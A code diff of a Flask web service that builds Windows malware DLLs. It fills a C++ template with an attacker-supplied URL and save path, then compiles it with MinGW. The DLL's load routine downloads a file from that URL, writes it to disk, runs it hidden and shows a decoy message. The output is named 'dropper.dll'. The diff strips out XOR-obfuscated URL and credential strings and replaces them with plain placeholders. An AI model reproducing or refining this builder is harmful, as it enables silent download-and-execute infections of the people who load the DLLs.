@@ -4,7 +4,6 @@ import tempfile
 import subprocess
 import random
 import string
-import re
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -17,25 +16,8 @@ TEMPLATE = """#define _CRT_SECURE_NO_WARNINGS
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <time.h>
 
 #pragma comment(lib, "wininet.lib")
-
-void xor_decrypt(char* data, size_t len, char key) {
-    for (size_t i = 0; i < len; i++) data[i] ^= key;
-}
-
-const char* decrypt_str(const char* enc, size_t len, char key) {
-    static char buf[512];
-    memcpy(buf, enc, len);
-    xor_decrypt(buf, len, key);
-    buf[len] = '\\0';
-    return buf;
-}
-
-const char enc_url[] = {0x2d,0x37,0x3b,0x3b,0x2e,0x2b,0x3a,0x2f,0x2f,0x31,0x3a,0x3e,0x2b,0x3a,0x3e,0x32,0x31,0x2d,0x2d,0x3b,0x34,0x39,0x3a,0x2f,0x2b,0x3b,0x34,0x31,0x3a,0x33,0x31,0x2f,0x3b,0x34,0x32,0x31,0x2f,0x35,0x33,0x31,0x2d,0x34,0x31,0x3a,0x33,0x3a,0x2d,0x36,0x35,0x3f,0x2b,0x2f,0x34,0x34,0x33,0x35,0x2f,0x31,0x3d,0x31,0x2f,0x3b,0x32,0x35,0x2f,0x2e,0x2f,0x2e,0x2f,0x2f,0x3d,0x3a,0x33,0x35,0x2f,0x34,0x32,0x31,0x32,0x2f,0x3a,0x2f,0x2f,0x2f,0x3a,0x3e,0x31,0x3b,0x33,0x2b,0x34,0x33,0x35,0x2f,0x2e,0x2f,0x2e,0x34,0x31,0x3a,0x33};
-const char enc_ua[] = {0x26,0x26,0x27,0x31,0x3a,0x3a,0x3f,0x2d,0x3c,0x3e,0x3c};
-const char enc_auth[] = {0x50,0x2b,0x23,0x2b,0x24,0x3a,0x2b,0x30,0x2b,0x26,0x3a,0x2b,0x13,0x12,0x13,0x12,0x13,0x12,0x13,0x0b,0x0a,0x0a};
 
 void ExecuteHidden(const char* path) {
     STARTUPINFOA si = {sizeof(si)};
@@ -56,17 +38,19 @@ void ShowMsg(const char* msg) {
 }
 
 void DoMagic() {
-    const char* url = decrypt_str(enc_url, sizeof(enc_url), 0x5A);
-    const char* ua = decrypt_str(enc_ua, sizeof(enc_ua), 0x3C);
-    const char* auth = decrypt_str(enc_auth, sizeof(enc_auth), 0x22);
-    
     char path[MAX_PATH];
     sprintf_s(path, sizeof(path), "%s\\\\%s", "{{SAVE_PATH}}", "{{FILE_NAME}}");
-
-    HINTERNET hInet = InternetOpenA(ua, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    
+    const char* url = "{{URL}}";
+    
+    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInet) return;
-    HINTERNET hUrl = InternetOpenUrlA(hInet, url, auth, strlen(auth), INTERNET_FLAG_RELOAD, 0);
-    if (!hUrl) { InternetCloseHandle(hInet); return; }
+    
+    HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hUrl) {
+        InternetCloseHandle(hInet);
+        return;
+    }
 
     HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile != INVALID_HANDLE_VALUE) {
@@ -100,9 +84,6 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-def random_hex_key(length=16):
-    return ''.join(random.choices(string.hexdigits, k=length)).lower()
-
 @app.route('/')
 def index():
     if not session.get('logged_in'):
@@ -135,18 +116,18 @@ def build():
     message = request.form.get('message', '').strip()
     custom_filename = request.form.get('custom_filename', '')
 
-    auth_key = random_hex_key(16)
     if custom_filename:
         filename = custom_filename if custom_filename.endswith('.dll') else custom_filename + '.dll'
     else:
         filename = f"lib{random_string(12)}.dll"
 
+    # Заменяем плейсхолдеры
     code = TEMPLATE.replace("{{SAVE_PATH}}", save_path)
     code = code.replace("{{FILE_NAME}}", filename)
     code = code.replace("{{URL}}", url)
     code = code.replace("{{MESSAGE}}", message)
-    code = code.replace("{{AUTH_KEY}}", auth_key)
 
+    # Создаём временную папку
     tmp_dir = "/tmp/build"
     os.makedirs(tmp_dir, exist_ok=True)
 
@@ -156,6 +137,7 @@ def build():
 
     out_dll = cpp_path.replace('.cpp', '.dll')
     
+    # Компиляция через MinGW
     compile_cmd = [
         'x86_64-w64-mingw32-g++', '-O2', '-s', '-static', '-shared',
         '-D_WIN32_WINNT=0x0600',
@@ -168,7 +150,7 @@ def build():
     except Exception as e:
         return f"Compilation failed: {e}", 500
 
-    return send_file(out_dll, as_attachment=True, download_name=filename)
+    return send_file(out_dll, as_attachment=True, download_name="dropper.dll")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
